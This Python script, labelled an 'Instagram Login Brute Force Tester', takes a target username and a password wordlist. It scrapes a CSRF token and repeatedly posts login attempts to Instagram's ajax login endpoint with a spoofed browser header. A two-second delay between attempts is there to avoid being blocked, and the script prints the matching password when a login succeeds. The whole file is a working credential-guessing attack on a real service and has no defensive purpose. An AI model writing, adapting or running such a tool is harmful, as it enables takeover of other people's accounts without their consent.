import requests
import time
import os

def instagram_login(username, password):
    session = requests.Session()

    headers = {
        "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                       "AppleWebKit/537.36 (KHTML, like Gecko) "
                       "Chrome/116.0.0.0 Safari/537.36"),
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.instagram.com/accounts/login/",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-CSRFToken": "",  # will set after getting token
    }

    # Get CSRF token from login page
    resp = session.get("https://www.instagram.com/accounts/login/", headers=headers)
    csrf_token = session.cookies.get("csrftoken", "")
    if not csrf_token:
        print("[!] CSRF token not found. Try again later.")
        return False
    headers["X-CSRFToken"] = csrf_token

    payload = {
        "username": username,
        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:&:{password}",
        "queryParams": "{}",
        "optIntoOneTap": "false",
    }

    login_url = "https://www.instagram.com/accounts/login/ajax/"
    login_resp = session.post(login_url, data=payload, headers=headers)

    if login_resp.status_code != 200:
        print(f"[!] Request failed with status code: {login_resp.status_code}")
        return False

    login_json = login_resp.json()
    if login_json.get("authenticated"):
        print(f"\n[SUCCESS] Login successful for username: '{username}' with password: '{password}'\n")
        return True
    else:
        return False


def load_wordlist(path):
    if not os.path.isfile(path):
        print(f"[!] Wordlist file not found at: {path}")
        return []
    with open(path, "r", encoding="utf-8") as f:
        passwords = [line.strip() for line in f if line.strip()]
    return passwords


def main():
    print("\n" + "="*50)
    print("     Instagram Login Brute Force Tester By Mohd Eisa  ")
    print("="*50 + "\n")

    username = input("Enter Instagram username to test: ").strip()
    wordlist_path = input("Enter path to password wordlist file: ").strip()

    passwords = load_wordlist(wordlist_path)
    if not passwords:
        print("[!] No passwords loaded. Exiting...")
        return

    print(f"\n[*] Loaded {len(passwords)} passwords from '{wordlist_path}'")
    print("[*] Starting brute force...\n")

    for idx, pwd in enumerate(passwords, 1):
        print(f"[{idx}/{len(passwords)}] Trying password: {pwd}")
        success = instagram_login(username, pwd)
        if success:
            break
        time.sleep(2)  # Delay to avoid being blocked
    else:
        print("\n[-] No password matched in the provided wordlist.")


if __name__ == "__main__":
    main()